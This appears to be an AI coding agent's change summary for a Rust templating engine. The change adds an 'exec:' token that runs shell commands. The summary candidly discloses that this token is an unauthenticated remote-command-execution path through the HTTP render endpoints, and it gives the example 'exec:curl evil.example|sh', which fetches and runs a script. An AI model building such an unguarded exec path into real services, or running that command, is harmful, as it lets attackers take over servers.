## Summary
`Engine::expand` in `src/engine.rs` now recognizes tokens of the form `exec:CMD`: it strips the `exec:` prefix, runs the remainder with `sh -c CMD` via `std::process::Command`, and returns the trimmed stdout as the expansion (stdout is returned even on a nonzero exit status, per the "run CMD and expand to its stdout" spec). All other tokens fall through unchanged to the existing TTL'd snippet-cache lookup, so `year`/`brand`/unknown-token behavior is untouched. No new dependencies were added (`std::process::Command` is stdlib); `cargo build` succeeds.

**Security consequence a reviewer must know:** `expand` is reachable from `Page::render_token` → `Page::render`, which is called directly by `api::render_one` (`POST /render`) and `api::render_many` (`POST /render-batch`) with tokens taken straight from the request body, as well as by `report::build_all`'s periodic rebuild job. As implemented, this makes `exec:` an unauthenticated remote command execution primitive on any deployment where those HTTP handlers accept client-supplied tokens — a request containing a token like `exec:curl evil.example|sh` will execute arbitrary shell commands with the server process's privileges. I added a prominent doc comment on `Engine::expand` flagging this, but did not add an allowlist/authorization gate since the task asked specifically for `exec:CMD` to behave this way; before shipping this to any endpoint that accepts untrusted tokens, the caller should validate/allowlist tokens (or drop the `exec:` directive entirely) upstream of `Engine::expand`.
